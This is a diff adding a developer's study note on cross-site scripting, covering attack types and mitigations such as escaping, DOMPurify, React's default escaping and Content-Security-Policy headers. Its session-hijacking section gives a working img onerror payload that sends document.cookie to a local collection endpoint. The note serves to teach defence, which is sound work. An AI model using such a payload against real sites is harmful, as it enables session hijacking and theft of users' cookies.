@@ -1,0 +1,47 @@
+Overview
+========
+[IMG:1]
+
+
+XSS (Cross-Site Scripting)
+==========================
+[IMG:2]
+Lets say you are reading value/query param from url (like ?name="Saketh kota") and showing it in UI. Now in place of the "Saketh Kota", you can insert anything like an html element / form elements,
+to steal personal/sesitive informations from cookies.
+**Note: Now a days new browsers are smart enough not allowing you to insert a script tag in URL, but they still allow you to insert html tags.
+        So you can insert a img tag instea and not give any source or give a dummy string. Then the onerror function in image tag will be executed in which you can write your javascript to steam cookies.
+
+Vulnerabilities
+...............
+1. User session hijacking => stealing cookie information
+     Example: ?name=<img src="does-not-exist" onerror="var img = document.createElement(\'img\');img.src=`http://127.0.0.1:5500/cookie?data=${document.cookie}`;document.querySelector(\'body\').appendChild(img);\">
+    (You can encode it using encodeURIComponent() and paste it in the URL.)
+(For remaining vulnerability examples, view below images)
+2. Unauthorized activities => If there is any publicly exposed function which makes api call, you can call that from your browser (from url) to pass hacking code.
+3. Capturing Keystrokes => In the url, you can mention code to capture key strokes and pass it to your end point
+4. Stealing critical information => You can take the entire html code by injecting your script in the url.
+5. Phishing Attack => You can inject HTMl code from the URL which can be a form element replacing the actual form in the website
+[IMG:3-6]
+
+
+Mitigations
+...........
+1. List all possible ways to take user input
+2. Replace innerHtml with innerText / textContent
+3. Escaping  - (Escape html statring (<) ending (>) tags from the input)
+4. Use libraries like React which by defult takes cares of thse XSS - (Because when you mention {name} in jsx, it expects only the text/js code text so by defult ignores of all these html injections)
+5. Sanitize: DOMPurify - (If you are not using librarirs or even within libraries if you re using DangerouslyStyledInnerHTML kind of this to inject HTML in jsx instead of text, you can use libraries like DOMPurify to purify the input text, which takes cares of all the security issues in the input text)
+6. CSP Headers - (Sometimes things are not in your hands like someone can inject third party resource/script into your browser. To handle all these, from server, you can add few headers which tells which resources/scripts to trust and what type of content to accept and all to overcome these issues)
+7. Avoid using 'eval'
+
+CSP (Content Security Policy) 
+.............................
+1. Allowed Sources - Tells from what sources/origins you can load the scripts/images/iframes...
+2. Script nonce - To differentiate the inline scripts injected by you or by hacker by adding 'nonce' attribute inside your safe script tag - <script nonce="randomKey"></script>
+3. Report-only mode - Now everyone can see why you are not able to load few resources script/img/iframe based on your console error message about Content-Security-Policy. So you can restrict to whom all to report that error using 'report-to defult/report-uri default(older one)' headers.
+
+View index.js inside mitigation folder
+
+
+SUMMARY of XSS: Anyone can inject anything from url - query param, if you are showing that query param in UI/code. They can steal critical info/capture Keystrokes and many more. As a developer we need to take care of these things by not using innerHTML, by escaping '<','>' tags and by sanitizing inputs before use using some libraries like DOMPurify. Last not the least we need to set headers like Content-Security-Policy to specify from what all origin we are allowed to download scrips/images/iframes...
+
